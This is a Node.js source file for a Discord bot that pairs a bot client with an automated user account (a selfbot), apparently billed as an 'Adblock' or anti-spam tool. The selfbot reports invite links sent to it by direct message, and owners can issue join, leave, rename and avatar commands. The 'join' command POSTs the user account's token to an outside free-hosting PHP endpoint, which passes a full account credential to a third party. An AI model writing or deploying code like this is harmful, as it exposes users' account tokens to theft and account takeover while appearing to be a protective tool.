const Discord = require('discord.js');
const client = new Discord.Client();
const fetch = require('node-fetch');
const USER = new Discord.Client();
const ms = require('ms');
const Attachment = require('discord.js').Attachment;
const {TOKENUSER, TOKENBOT, BOTID, USERID, CHANNELID, OWNERS, PREFIX} = require('./system');

client.on('ready', () => {
   console.log(`Online: ${client.user.tag}\nGuilds: ${client.guilds.size}`);
   client.user.setGame(`3rb Network`);
}).on("error", function(error) {
  return console.log(error);
});

USER.on('ready', () => {
  console.log(`Online: ${USER.user.tag}\nGuilds: ${USER.guilds.size}`);
}).on("error", function(error) {
 return console.log(error);
})

.on('message', message => {
   if (message.author.id === USERID) return;
    if (message.channel.type !== "dm") return;
    let Dis = message.content.substring(message.toString().indexOf("discord.gg/"),message.toString().indexOf("discord.gg/") + 18);
    if (message.toString().indexOf("discord.gg/") >= 0) {
    if (message.channel.guild) return;
    const LINK = USER.users.get(BOTID);
    LINK.send(`**Invite Link Found:** https://${Dis}\n**Sent by:** <@${message.author.id}>  \`    [${message.author.id}]\``);
        };
});

client.on("message", message => {
  if (message.author.bot) return;
  let A = message.content.split(' ');
  let S = A.join(' ');
  if (message.content.startsWith(S)) {
  if (message.author.id !== USERID) return;
  if (message.channel.guild) return;
  client.channels.get(CHANNELID).send(S);
 }
})

.on('message', async msg => {
      if (msg.content === PREFIX + 'leave') {
      if (msg.channel.id !== CHANNELID) return false;
      if (!OWNERS.includes(msg.author.id)) return msg.channel.send(`الامر فقط للمسؤلين`);
          msg.delete();
      if (!USER.guilds.get(msg.guild.id)) return msg.channel.send(`**حساب التحقق في الخراج بلفعل، استخدم امر الدخول**`).then(m => m.delete(10000));
          msg.channel.send(`Preparing checkout for <@${USERID}>`).then(m => {
          setTimeout(() => USER.guilds.get(msg.guild.id).leave(), 5000);
          setTimeout(() => m.edit(`Leaving <@${USERID}>**'s** The guild, Request by **${msg.member.nickname || msg.author.username}**`), 6000);
      });
    } else if (msg.content === PREFIX + 'join') { 
      if (msg.channel.id !== CHANNELID) return false;
      if (!OWNERS.includes(msg.author.id)) return false;
          msg.delete();
      if (USER.guilds.get(msg.guild.id)) return msg.channel.send(`**حساب التحقق موجود بلفعل، استخدم امر الخروج**`).then(m => m.delete(10000));
          let invite = await msg.channel.createInvite({ maxUses: 1});
          msg.channel.send(`Preparing for enter <@${USERID}>`).then(m => {
          setTimeout(() => fetch('http://antispambot.freeoda.com/joi.php?token='+process.env.TOKENUSER+'&invite='+ `${invite.code}` ,{ method: 'POST'}), 5000);
          setTimeout(() => m.edit(`<@${USERID}>**'s** Join The guild, Request by **${msg.member.nickname || msg.author.username}**`), 8000);
      });
    }
  });

let COOL = [];
client.on("message",async(msg) => {

    if (msg.content.startsWith(`${PREFIX}setname`)) {
    let id = msg.author.id;
    let args = msg.content.split(" ").slice(1);
    let join = args.join(' ');
    if (COOL.includes(id)) return;
    if (!OWNERS.includes(msg.author.id)) return msg.channel.send(`الامر فقط للمسؤلين`);
    if (join.length < 2 || join.length > 32) return msg.channel.send('**Must be betweed 2 and 32 in Length.**').then(msg => (msg.delete(6500)));
      USER.user.setUsername(join,'11221122');
      msg.channel.send(`The name was changed From: \`${USER.user.username}\` To: \`${join}\`, Request by **${msg.member.nickname || msg.author.username}**`);
COOL.unshift(id);
setTimeout(() => {
  COOL.shift(id);
  msg.channel.send("**بإمكانك تغير اسم الحساب الان**");
}, ms("30m"));
    } else if (msg.content.startsWith(`${PREFIX}setavatar`)) {
      let id = msg.author.id;
      let args = msg.content.split(" ").slice(1);
      let join = args.join(' ');
      if (COOL.includes(id)) return;
      if (!OWNERS.includes(msg.author.id)) return msg.channel.send(`الامر فقط للمسؤلين`);
      if (join.length === 0) return false;
         USER.user.setAvatar(join);
          msg.delete();
          msg.channel.send(`<@${USER.user.id}>**'s** Image has been changed, Requested by **${msg.member.nickname || msg.author.username}**`,{ files: [new Attachment(`${USER.user.avatarURL}`, 'file.jpg')]}).then(m => {
          msg.channel.send(`**To:**`,{ files: [new Attachment(`${join}`, 'file.jpg')] });
          });
          COOL.unshift(id);
  setTimeout(() => {
    COOL.shift(id);
    msg.channel.send("**بإمكانك تغير صورة الحساب الان**");
  }, ms("30m"));
      } else if (msg.content.startsWith(`${PREFIX}help`)) {
        if (!OWNERS.includes(msg.author.id)) return msg.channel.send(`الامر فقط للمسؤلين`);
        let O = 1;
        let NP = msg.guild.members.filter(m => OWNERS.includes(m.id)).map(m => `**${O++}** \`${m.user.nickname || m.user.username}\``);
        msg.channel.send({embed: {
          color: 3447003,
          description: `**Help for Adblock

${PREFIX}**join
**${PREFIX}**leave
**${PREFIX}**setname
**${PREFIX}**setavatar

**LogChannel** \`${client.channels.get(CHANNELID).name}\`
**Account Adblock** \`${USER.user.nickname || USER.user.username}\`
**Owners** 
${NP.join('\n')} 
`
        }});
      }
});


USER.login(process.env.TOKENUSER); client.login(process.env.TOKENBOT);

